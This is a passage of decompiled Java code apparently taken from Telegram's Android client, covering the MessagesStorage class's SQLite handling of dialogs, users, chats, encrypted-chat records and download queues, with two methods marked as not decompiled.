                    r8 = r8.admin_id;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 16;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.mtproto_seq;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r7 = 17;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r3;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r8 = r8.id;	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.bindInteger(r7, r8);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r6.step();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r0.reuse();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r1.reuse();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r2.reuse();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r3.reuse();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    r4.reuse();	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r6 == 0) goto L_0x0150;
                L_0x014d:
                    r6.dispose();
                L_0x0150:
                    return;
                L_0x0151:
                    r8 = r7;
                    goto L_0x0048;
                L_0x0154:
                    r8 = r7;
                    goto L_0x0058;
                L_0x0157:
                    r8 = r7;
                    goto L_0x0068;
                L_0x015a:
                    r5 = move-exception;
                    org.telegram.messenger.FileLog.e(r5);	 Catch:{ Exception -> 0x015a, all -> 0x0164 }
                    if (r6 == 0) goto L_0x0150;
                L_0x0160:
                    r6.dispose();
                    goto L_0x0150;
                L_0x0164:
                    r7 = move-exception;
                    if (r6 == 0) goto L_0x016a;
                L_0x0167:
                    r6.dispose();
                L_0x016a:
                    throw r7;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.63.run():void");
                }
            });
        }
    }

    public boolean isDialogHasMessages(long did) {
        final Semaphore semaphore = new Semaphore(0);
        final boolean[] result = new boolean[1];
        final long j = did;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid FROM messages WHERE uid = %d LIMIT 1", new Object[]{Long.valueOf(j)}), new Object[0]);
                    result[0] = cursor.next();
                    cursor.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                } finally {
                    semaphore.release();
                }
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return result[0];
    }

    public boolean hasAuthMessage(final int date) {
        final Semaphore semaphore = new Semaphore(0);
        final boolean[] result = new boolean[1];
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid FROM messages WHERE uid = 777000 AND date = %d AND mid < 0 LIMIT 1", new Object[]{Integer.valueOf(date)}), new Object[0]);
                    result[0] = cursor.next();
                    cursor.dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                } finally {
                    semaphore.release();
                }
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        return result[0];
    }

    public void getEncryptedChat(final int chat_id, final Semaphore semaphore, final ArrayList<TLObject> result) {
        if (semaphore != null && result != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /*
                    r7 = this;
                    r3 = new java.util.ArrayList;	 Catch:{ Exception -> 0x0062 }
                    r3.<init>();	 Catch:{ Exception -> 0x0062 }
                    r1 = new java.util.ArrayList;	 Catch:{ Exception -> 0x0062 }
                    r1.<init>();	 Catch:{ Exception -> 0x0062 }
                    r4 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0062 }
                    r5 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0062 }
                    r5.<init>();	 Catch:{ Exception -> 0x0062 }
                    r6 = "";
                    r5 = r5.append(r6);	 Catch:{ Exception -> 0x0062 }
                    r6 = r3;	 Catch:{ Exception -> 0x0062 }
                    r5 = r5.append(r6);	 Catch:{ Exception -> 0x0062 }
                    r5 = r5.toString();	 Catch:{ Exception -> 0x0062 }
                    r4.getEncryptedChatsInternal(r5, r1, r3);	 Catch:{ Exception -> 0x0062 }
                    r4 = r1.isEmpty();	 Catch:{ Exception -> 0x0062 }
                    if (r4 != 0) goto L_0x005c;
                L_0x002b:
                    r4 = r3.isEmpty();	 Catch:{ Exception -> 0x0062 }
                    if (r4 != 0) goto L_0x005c;
                L_0x0031:
                    r2 = new java.util.ArrayList;	 Catch:{ Exception -> 0x0062 }
                    r2.<init>();	 Catch:{ Exception -> 0x0062 }
                    r4 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x0062 }
                    r5 = ",";
                    r5 = android.text.TextUtils.join(r5, r3);	 Catch:{ Exception -> 0x0062 }
                    r4.getUsersInternal(r5, r2);	 Catch:{ Exception -> 0x0062 }
                    r4 = r2.isEmpty();	 Catch:{ Exception -> 0x0062 }
                    if (r4 != 0) goto L_0x005c;
                L_0x0048:
                    r4 = r5;	 Catch:{ Exception -> 0x0062 }
                    r5 = 0;
                    r5 = r1.get(r5);	 Catch:{ Exception -> 0x0062 }
                    r4.add(r5);	 Catch:{ Exception -> 0x0062 }
                    r4 = r5;	 Catch:{ Exception -> 0x0062 }
                    r5 = 0;
                    r5 = r2.get(r5);	 Catch:{ Exception -> 0x0062 }
                    r4.add(r5);	 Catch:{ Exception -> 0x0062 }
                L_0x005c:
                    r4 = r4;
                    r4.release();
                L_0x0061:
                    return;
                L_0x0062:
                    r0 = move-exception;
                    org.telegram.messenger.FileLog.e(r0);	 Catch:{ all -> 0x006c }
                    r4 = r4;
                    r4.release();
                    goto L_0x0061;
                L_0x006c:
                    r4 = move-exception;
                    r5 = r4;
                    r5.release();
                    throw r4;
                    */
                    throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.66.run():void");
                }
            });
        }
    }

    public void putEncryptedChat(final TLRPC$EncryptedChat chat, final User user, final TLRPC$TL_dialog dialog) {
        if (chat != null) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    int i = 1;
                    try {
                        int length;
                        if ((chat.key_hash == null || chat.key_hash.length < 16) && chat.auth_key != null) {
                            chat.key_hash = AndroidUtilities.calcAuthKeyHash(chat.auth_key);
                        }
                        SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("REPLACE INTO enc_chats VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                        NativeByteBuffer data = new NativeByteBuffer(chat.getObjectSize());
                        if (chat.a_or_b != null) {
                            length = chat.a_or_b.length;
                        } else {
                            length = 1;
                        }
                        NativeByteBuffer data2 = new NativeByteBuffer(length);
                        if (chat.auth_key != null) {
                            length = chat.auth_key.length;
                        } else {
                            length = 1;
                        }
                        NativeByteBuffer data3 = new NativeByteBuffer(length);
                        if (chat.future_auth_key != null) {
                            length = chat.future_auth_key.length;
                        } else {
                            length = 1;
                        }
                        NativeByteBuffer data4 = new NativeByteBuffer(length);
                        if (chat.key_hash != null) {
                            i = chat.key_hash.length;
                        }
                        NativeByteBuffer data5 = new NativeByteBuffer(i);
                        chat.serializeToStream(data);
                        state.bindInteger(1, chat.id);
                        state.bindInteger(2, user.id);
                        state.bindString(3, MessagesStorage.this.formatUserSearchName(user));
                        state.bindByteBuffer(4, data);
                        if (chat.a_or_b != null) {
                            data2.writeBytes(chat.a_or_b);
                        }
                        if (chat.auth_key != null) {
                            data3.writeBytes(chat.auth_key);
                        }
                        if (chat.future_auth_key != null) {
                            data4.writeBytes(chat.future_auth_key);
                        }
                        if (chat.key_hash != null) {
                            data5.writeBytes(chat.key_hash);
                        }
                        state.bindByteBuffer(5, data2);
                        state.bindByteBuffer(6, data3);
                        state.bindInteger(7, chat.ttl);
                        state.bindInteger(8, chat.layer);
                        state.bindInteger(9, chat.seq_in);
                        state.bindInteger(10, chat.seq_out);
                        state.bindInteger(11, (chat.key_use_count_in << 16) | chat.key_use_count_out);
                        state.bindLong(12, chat.exchange_id);
                        state.bindInteger(13, chat.key_create_date);
                        state.bindLong(14, chat.future_key_fingerprint);
                        state.bindByteBuffer(15, data4);
                        state.bindByteBuffer(16, data5);
                        state.bindInteger(17, chat.in_seq_no);
                        state.bindInteger(18, chat.admin_id);
                        state.bindInteger(19, chat.mtproto_seq);
                        state.step();
                        state.dispose();
                        data.reuse();
                        data2.reuse();
                        data3.reuse();
                        data4.reuse();
                        data5.reuse();
                        if (dialog != null) {
                            state = MessagesStorage.this.database.executeFast("REPLACE INTO dialogs VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                            state.bindLong(1, dialog.id);
                            state.bindInteger(2, dialog.last_message_date);
                            state.bindInteger(3, dialog.unread_count);
                            state.bindInteger(4, dialog.top_message);
                            state.bindInteger(5, dialog.read_inbox_max_id);
                            state.bindInteger(6, dialog.read_outbox_max_id);
                            state.bindInteger(7, 0);
                            state.bindInteger(8, dialog.unread_mentions_count);
                            state.bindInteger(9, dialog.pts);
                            state.bindInteger(10, 0);
                            state.bindInteger(11, dialog.pinnedNum);
                            state.step();
                            state.dispose();
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    private String formatUserSearchName(User user) {
        StringBuilder str = new StringBuilder("");
        if (user.first_name != null && user.first_name.length() > 0) {
            str.append(user.first_name);
        }
        if (user.last_name != null && user.last_name.length() > 0) {
            if (str.length() > 0) {
                str.append(" ");
            }
            str.append(user.last_name);
        }
        str.append(";;;");
        if (user.username != null && user.username.length() > 0) {
            str.append(user.username);
        }
        return str.toString().toLowerCase();
    }

    private void putUsersInternal(ArrayList<User> users) throws Exception {
        if (users != null && !users.isEmpty()) {
            SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO users VALUES(?, ?, ?, ?)");
            for (int a = 0; a < users.size(); a++) {
                NativeByteBuffer data;
                User user = (User) users.get(a);
                if (user.min) {
                    SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM users WHERE uid = %d", new Object[]{Integer.valueOf(user.id)}), new Object[0]);
                    if (cursor.next()) {
                        try {
                            data = cursor.byteBufferValue(0);
                            if (data != null) {
                                User oldUser = User.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                if (oldUser != null) {
                                    if (user.username != null) {
                                        oldUser.username = user.username;
                                        oldUser.flags |= 8;
                                    } else {
                                        oldUser.username = null;
                                        oldUser.flags &= -9;
                                    }
                                    if (user.photo != null) {
                                        oldUser.photo = user.photo;
                                        oldUser.flags |= 32;
                                    } else {
                                        oldUser.photo = null;
                                        oldUser.flags &= -33;
                                    }
                                    user = oldUser;
                                }
                            }
                        } catch (Exception e) {
                            FileLog.e(e);
                        }
                    }
                    cursor.dispose();
                }
                state.requery();
                data = new NativeByteBuffer(user.getObjectSize());
                user.serializeToStream(data);
                state.bindInteger(1, user.id);
                state.bindString(2, formatUserSearchName(user));
                if (user.status != null) {
                    if (user.status instanceof TLRPC$TL_userStatusRecently) {
                        user.status.expires = -100;
                    } else if (user.status instanceof TLRPC$TL_userStatusLastWeek) {
                        user.status.expires = FetchConst.ERROR_UNKNOWN;
                    } else if (user.status instanceof TLRPC$TL_userStatusLastMonth) {
                        user.status.expires = FetchConst.ERROR_FILE_NOT_CREATED;
                    }
                    state.bindInteger(3, user.status.expires);
                } else {
                    state.bindInteger(3, 0);
                }
                state.bindByteBuffer(4, data);
                state.step();
                data.reuse();
            }
            state.dispose();
        }
    }

    private void putChatsInternal(ArrayList<TLRPC$Chat> chats) throws Exception {
        if (chats != null && !chats.isEmpty()) {
            SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO chats VALUES(?, ?, ?)");
            for (int a = 0; a < chats.size(); a++) {
                NativeByteBuffer data;
                TLRPC$Chat chat = (TLRPC$Chat) chats.get(a);
                if (chat.min) {
                    SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM chats WHERE uid = %d", new Object[]{Integer.valueOf(chat.id)}), new Object[0]);
                    if (cursor.next()) {
                        try {
                            data = cursor.byteBufferValue(0);
                            if (data != null) {
                                TLRPC$Chat oldChat = TLRPC$Chat.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                if (oldChat != null) {
                                    oldChat.title = chat.title;
                                    oldChat.photo = chat.photo;
                                    oldChat.broadcast = chat.broadcast;
                                    oldChat.verified = chat.verified;
                                    oldChat.megagroup = chat.megagroup;
                                    oldChat.democracy = chat.democracy;
                                    if (chat.username != null) {
                                        oldChat.username = chat.username;
                                        oldChat.flags |= 64;
                                    } else {
                                        oldChat.username = null;
                                        oldChat.flags &= -65;
                                    }
                                    chat = oldChat;
                                }
                            }
                        } catch (Exception e) {
                            FileLog.e(e);
                        }
                    }
                    cursor.dispose();
                }
                state.requery();
                data = new NativeByteBuffer(chat.getObjectSize());
                chat.serializeToStream(data);
                state.bindInteger(1, chat.id);
                if (chat.title != null) {
                    state.bindString(2, chat.title.toLowerCase());
                } else {
                    state.bindString(2, "");
                }
                state.bindByteBuffer(3, data);
                state.step();
                data.reuse();
            }
            state.dispose();
        }
    }

    public void getUsersInternal(String usersToLoad, ArrayList<User> result) throws Exception {
        if (usersToLoad != null && usersToLoad.length() != 0 && result != null) {
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT data, status FROM users WHERE uid IN(%s)", new Object[]{usersToLoad}), new Object[0]);
            while (cursor.next()) {
                try {
                    NativeByteBuffer data = cursor.byteBufferValue(0);
                    if (data != null) {
                        User user = User.TLdeserialize(data, data.readInt32(false), false);
                        data.reuse();
                        if (user != null) {
                            if (user.status != null) {
                                user.status.expires = cursor.intValue(1);
                            }
                            result.add(user);
                        }
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
            cursor.dispose();
        }
    }

    public void getChatsInternal(String chatsToLoad, ArrayList<TLRPC$Chat> result) throws Exception {
        if (chatsToLoad != null && chatsToLoad.length() != 0 && result != null) {
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT data FROM chats WHERE uid IN(%s)", new Object[]{chatsToLoad}), new Object[0]);
            while (cursor.next()) {
                try {
                    NativeByteBuffer data = cursor.byteBufferValue(0);
                    if (data != null) {
                        TLRPC$Chat chat = TLRPC$Chat.TLdeserialize(data, data.readInt32(false), false);
                        data.reuse();
                        if (chat != null) {
                            result.add(chat);
                        }
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
            cursor.dispose();
        }
    }

    public void getEncryptedChatsInternal(String chatsToLoad, ArrayList<TLRPC$EncryptedChat> result, ArrayList<Integer> usersToLoad) throws Exception {
        if (chatsToLoad != null && chatsToLoad.length() != 0 && result != null) {
            SQLiteCursor cursor = this.database.queryFinalized(String.format(Locale.US, "SELECT data, user, g, authkey, ttl, layer, seq_in, seq_out, use_count, exchange_id, key_date, fprint, fauthkey, khash, in_seq_no, admin_id, mtproto_seq FROM enc_chats WHERE uid IN(%s)", new Object[]{chatsToLoad}), new Object[0]);
            while (cursor.next()) {
                try {
                    NativeByteBuffer data = cursor.byteBufferValue(0);
                    if (data != null) {
                        TLRPC$EncryptedChat chat = TLRPC$EncryptedChat.TLdeserialize(data, data.readInt32(false), false);
                        data.reuse();
                        if (chat != null) {
                            chat.user_id = cursor.intValue(1);
                            if (!(usersToLoad == null || usersToLoad.contains(Integer.valueOf(chat.user_id)))) {
                                usersToLoad.add(Integer.valueOf(chat.user_id));
                            }
                            chat.a_or_b = cursor.byteArrayValue(2);
                            chat.auth_key = cursor.byteArrayValue(3);
                            chat.ttl = cursor.intValue(4);
                            chat.layer = cursor.intValue(5);
                            chat.seq_in = cursor.intValue(6);
                            chat.seq_out = cursor.intValue(7);
                            int use_count = cursor.intValue(8);
                            chat.key_use_count_in = (short) (use_count >> 16);
                            chat.key_use_count_out = (short) use_count;
                            chat.exchange_id = cursor.longValue(9);
                            chat.key_create_date = cursor.intValue(10);
                            chat.future_key_fingerprint = cursor.longValue(11);
                            chat.future_auth_key = cursor.byteArrayValue(12);
                            chat.key_hash = cursor.byteArrayValue(13);
                            chat.in_seq_no = cursor.intValue(14);
                            int admin_id = cursor.intValue(15);
                            if (admin_id != 0) {
                                chat.admin_id = admin_id;
                            }
                            chat.mtproto_seq = cursor.intValue(16);
                            result.add(chat);
                        }
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
            cursor.dispose();
        }
    }

    private void putUsersAndChatsInternal(ArrayList<User> users, ArrayList<TLRPC$Chat> chats, boolean withTransaction) {
        if (withTransaction) {
            try {
                this.database.beginTransaction();
            } catch (Exception e) {
                FileLog.e(e);
                return;
            }
        }
        putUsersInternal(users);
        putChatsInternal(chats);
        if (withTransaction) {
            this.database.commitTransaction();
        }
    }

    public void putUsersAndChats(final ArrayList<User> users, final ArrayList<TLRPC$Chat> chats, final boolean withTransaction, boolean useQueue) {
        if (users != null && users.isEmpty() && chats != null && chats.isEmpty()) {
            return;
        }
        if (useQueue) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    MessagesStorage.this.putUsersAndChatsInternal(users, chats, withTransaction);
                }
            });
        } else {
            putUsersAndChatsInternal(users, chats, withTransaction);
        }
    }

    public void removeFromDownloadQueue(long id, int type, boolean move) {
        final boolean z = move;
        final int i = type;
        final long j = id;
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    if (z) {
                        int minDate = -1;
                        SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(date) FROM download_queue WHERE type = %d", new Object[]{Integer.valueOf(i)}), new Object[0]);
                        if (cursor.next()) {
                            minDate = cursor.intValue(0);
                        }
                        cursor.dispose();
                        if (minDate != -1) {
                            MessagesStorage.this.database.executeFast(String.format(Locale.US, "UPDATE download_queue SET date = %d WHERE uid = %d AND type = %d", new Object[]{Integer.valueOf(minDate - 1), Long.valueOf(j), Integer.valueOf(i)})).stepThis().dispose();
                            return;
                        }
                        return;
                    }
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "DELETE FROM download_queue WHERE uid = %d AND type = %d", new Object[]{Long.valueOf(j), Integer.valueOf(i)})).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void clearDownloadQueue(final int type) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    if (type == 0) {
                        MessagesStorage.this.database.executeFast("DELETE FROM download_queue WHERE 1").stepThis().dispose();
                        return;
                    }
                    MessagesStorage.this.database.executeFast(String.format(Locale.US, "DELETE FROM download_queue WHERE type = %d", new Object[]{Integer.valueOf(type)})).stepThis().dispose();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void getDownloadQueue(final int type) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    final ArrayList<DownloadObject> objects = new ArrayList();
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT uid, type, data FROM download_queue WHERE type = %d ORDER BY date DESC LIMIT 3", new Object[]{Integer.valueOf(type)}), new Object[0]);
                    while (cursor.next()) {
                        DownloadObject downloadObject = new DownloadObject();
                        downloadObject.type = cursor.intValue(1);
                        downloadObject.id = cursor.longValue(0);
                        NativeByteBuffer data = cursor.byteBufferValue(2);
                        if (data != null) {
                            boolean z;
                            TLRPC$MessageMedia messageMedia = TLRPC$MessageMedia.TLdeserialize(data, data.readInt32(false), false);
                            data.reuse();
                            if (messageMedia.document != null) {
                                downloadObject.object = messageMedia.document;
                            } else if (messageMedia.photo != null) {
                                downloadObject.object = FileLoader.getClosestPhotoSizeWithSize(messageMedia.photo.sizes, AndroidUtilities.getPhotoSize());
                            }
                            if (messageMedia.ttl_seconds != 0) {
                                z = true;
                            } else {
                                z = false;
                            }
                            downloadObject.secret = z;
                        }
                        objects.add(downloadObject);
                    }
                    cursor.dispose();
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            MediaController.getInstance().processDownloadObjects(type, objects);
                        }
                    });
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private int getMessageMediaType(TLRPC$Message message) {
        if ((message instanceof TLRPC$TL_message) && (((message.media instanceof TLRPC$TL_messageMediaPhoto) || (message.media instanceof TLRPC$TL_messageMediaDocument)) && message.media.ttl_seconds != 0)) {
            return 1;
        }
        if ((message instanceof TLRPC$TL_message_secret) && (((message.media instanceof TLRPC$TL_messageMediaPhoto) && message.ttl > 0 && message.ttl <= 60) || MessageObject.isVoiceMessage(message) || MessageObject.isVideoMessage(message) || MessageObject.isRoundVideoMessage(message))) {
            return 1;
        }
        if ((message.media instanceof TLRPC$TL_messageMediaPhoto) || MessageObject.isVideoMessage(message)) {
            return 0;
        }
        return -1;
    }

    public void putWebPages(final HashMap<Long, TLRPC$WebPage> webPages) {
        if (webPages != null && !webPages.isEmpty()) {
            this.storageQueue.postRunnable(new Runnable() {
                public void run() {
                    try {
                        NativeByteBuffer data;
                        TLRPC$Message message;
                        final ArrayList<TLRPC$Message> messages = new ArrayList();
                        for (Entry<Long, TLRPC$WebPage> entry : webPages.entrySet()) {
                            SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT mid FROM webpage_pending WHERE id = " + entry.getKey(), new Object[0]);
                            ArrayList<Long> mids = new ArrayList();
                            while (cursor.next()) {
                                mids.add(Long.valueOf(cursor.longValue(0)));
                            }
                            cursor.dispose();
                            if (!mids.isEmpty()) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT mid, data FROM messages WHERE mid IN (%s)", new Object[]{TextUtils.join(",", mids)}), new Object[0]);
                                while (cursor.next()) {
                                    int mid = cursor.intValue(0);
                                    data = cursor.byteBufferValue(1);
                                    if (data != null) {
                                        message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                        data.reuse();
                                        if (message.media instanceof TLRPC$TL_messageMediaWebPage) {
                                            message.id = mid;
                                            message.media.webpage = (TLRPC$WebPage) entry.getValue();
                                            messages.add(message);
                                        }
                                    }
                                }
                                cursor.dispose();
                            }
                        }
                        if (!messages.isEmpty()) {
                            MessagesStorage.this.database.beginTransaction();
                            SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE messages SET data = ? WHERE mid = ?");
                            SQLitePreparedStatement state2 = MessagesStorage.this.database.executeFast("UPDATE media_v2 SET data = ? WHERE mid = ?");
                            for (int a = 0; a < messages.size(); a++) {
                                message = (TLRPC$Message) messages.get(a);
                                data = new NativeByteBuffer(message.getObjectSize());
                                message.serializeToStream(data);
                                long messageId = (long) message.id;
                                if (message.to_id.channel_id != 0) {
                                    messageId |= ((long) message.to_id.channel_id) << 32;
                                }
                                state.requery();
                                state.bindByteBuffer(1, data);
                                state.bindLong(2, messageId);
                                state.step();
                                state2.requery();
                                state2.bindByteBuffer(1, data);
                                state2.bindLong(2, messageId);
                                state2.step();
                                data.reuse();
                            }
                            state.dispose();
                            state2.dispose();
                            MessagesStorage.this.database.commitTransaction();
                            AndroidUtilities.runOnUIThread(new Runnable() {
                                public void run() {
                                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.didReceivedWebpages, new Object[]{messages});
                                }
                            });
                        }
                    } catch (Exception e) {
                        FileLog.e(e);
                    }
                }
            });
        }
    }

    public void overwriteChannel(final int channel_id, final TLRPC$TL_updates_channelDifferenceTooLong difference, final int newDialogType) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                boolean z = false;
                boolean checkInvite = false;
                try {
                    final long did = (long) (-channel_id);
                    int pinned = 0;
                    SQLiteCursor cursor = MessagesStorage.this.database.queryFinalized("SELECT pts, pinned FROM dialogs WHERE did = " + did, new Object[0]);
                    if (cursor.next()) {
                        pinned = cursor.intValue(1);
                    } else if (newDialogType != 0) {
                        checkInvite = true;
                    }
                    cursor.dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM bot_keyboard WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_counts_v2 WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_v2 WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM messages_holes WHERE uid = " + did).stepThis().dispose();
                    MessagesStorage.this.database.executeFast("DELETE FROM media_holes_v2 WHERE uid = " + did).stepThis().dispose();
                    BotQuery.clearBotKeyboard(did, null);
                    TLRPC$TL_messages_dialogs dialogs = new TLRPC$TL_messages_dialogs();
                    dialogs.chats.addAll(difference.chats);
                    dialogs.users.addAll(difference.users);
                    dialogs.messages.addAll(difference.messages);
                    TLRPC$TL_dialog dialog = new TLRPC$TL_dialog();
                    dialog.id = did;
                    dialog.flags = 1;
                    dialog.peer = new TLRPC$TL_peerChannel();
                    dialog.peer.channel_id = channel_id;
                    dialog.top_message = difference.top_message;
                    dialog.read_inbox_max_id = difference.read_inbox_max_id;
                    dialog.read_outbox_max_id = difference.read_outbox_max_id;
                    dialog.unread_count = difference.unread_count;
                    dialog.unread_mentions_count = difference.unread_mentions_count;
                    dialog.notify_settings = null;
                    if (pinned != 0) {
                        z = true;
                    }
                    dialog.pinned = z;
                    dialog.pinnedNum = pinned;
                    dialog.pts = difference.pts;
                    dialogs.dialogs.add(dialog);
                    MessagesStorage.this.putDialogsInternal(dialogs, false);
                    MessagesStorage.getInstance().updateDialogsWithDeletedMessages(new ArrayList(), null, false, channel_id);
                    AndroidUtilities.runOnUIThread(new Runnable() {
                        public void run() {
                            NotificationCenter.getInstance().postNotificationName(NotificationCenter.removeAllMessagesFromDialog, new Object[]{Long.valueOf(did), Boolean.valueOf(true)});
                        }
                    });
                    if (!checkInvite) {
                        return;
                    }
                    if (newDialogType == 1) {
                        MessagesController.getInstance().checkChannelInviter(channel_id);
                    } else {
                        MessagesController.getInstance().generateJoinMessage(channel_id, false);
                    }
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    public void putChannelViews(final SparseArray<SparseIntArray> channelViews, final boolean isChannel) {
        this.storageQueue.postRunnable(new Runnable() {
            public void run() {
                try {
                    MessagesStorage.this.database.beginTransaction();
                    SQLitePreparedStatement state = MessagesStorage.this.database.executeFast("UPDATE messages SET media = max((SELECT media FROM messages WHERE mid = ?), ?) WHERE mid = ?");
                    for (int a = 0; a < channelViews.size(); a++) {
                        int peer = channelViews.keyAt(a);
                        SparseIntArray messages = (SparseIntArray) channelViews.get(peer);
                        for (int b = 0; b < messages.size(); b++) {
                            int views = messages.get(messages.keyAt(b));
                            long messageId = (long) messages.keyAt(b);
                            if (isChannel) {
                                messageId |= ((long) (-peer)) << 32;
                            }
                            state.requery();
                            state.bindLong(1, messageId);
                            state.bindInteger(2, views);
                            state.bindLong(3, messageId);
                            state.step();
                        }
                    }
                    state.dispose();
                    MessagesStorage.this.database.commitTransaction();
                } catch (Exception e) {
                    FileLog.e(e);
                }
            }
        });
    }

    private boolean isValidKeyboardToSave(TLRPC$Message message) {
        return (message.reply_markup == null || (message.reply_markup instanceof TLRPC$TL_replyInlineMarkup) || (message.reply_markup.selective && !message.mentioned)) ? false : true;
    }

    private void putMessagesInternal(ArrayList<TLRPC$Message> messages, boolean withTransaction, boolean doNotUpdateDialogDate, int downloadMask, boolean ifNoLastMessage) {
        TLRPC$Message lastMessage;
        SQLiteCursor cursor;
        int a;
        Integer type;
        Integer count;
        if (ifNoLastMessage) {
            try {
                lastMessage = (TLRPC$Message) messages.get(0);
                if (lastMessage.dialog_id == 0) {
                    if (lastMessage.to_id.user_id != 0) {
                        lastMessage.dialog_id = (long) lastMessage.to_id.user_id;
                    } else if (lastMessage.to_id.chat_id != 0) {
                        lastMessage.dialog_id = (long) (-lastMessage.to_id.chat_id);
                    } else {
                        lastMessage.dialog_id = (long) (-lastMessage.to_id.channel_id);
                    }
                }
                int lastMid = -1;
                cursor = this.database.queryFinalized("SELECT last_mid FROM dialogs WHERE did = " + lastMessage.dialog_id, new Object[0]);
                if (cursor.next()) {
                    lastMid = cursor.intValue(0);
                }
                cursor.dispose();
                if (lastMid != 0) {
                    return;
                }
            } catch (Exception e) {
                FileLog.e(e);
                return;
            }
        }
        if (withTransaction) {
            this.database.beginTransaction();
        }
        HashMap<Long, TLRPC$Message> messagesMap = new HashMap();
        HashMap<Long, Integer> messagesCounts = new HashMap();
        HashMap<Long, Integer> mentionCounts = new HashMap();
        HashMap<Integer, HashMap<Long, Integer>> mediaCounts = null;
        HashMap<Long, TLRPC$Message> botKeyboards = new HashMap();
        HashMap<Long, Long> messagesMediaIdsMap = null;
        StringBuilder messageMediaIds = null;
        HashMap<Long, Integer> mediaTypes = null;
        StringBuilder messageIds = new StringBuilder();
        HashMap<Long, Integer> dialogsReadMax = new HashMap();
        HashMap<Long, Long> messagesIdsMap = new HashMap();
        HashMap<Long, Long> mentionsIdsMap = new HashMap();
        SQLitePreparedStatement state = this.database.executeFast("REPLACE INTO messages VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, ?, ?)");
        SQLitePreparedStatement state2 = null;
        SQLitePreparedStatement state3 = this.database.executeFast("REPLACE INTO randoms VALUES(?, ?)");
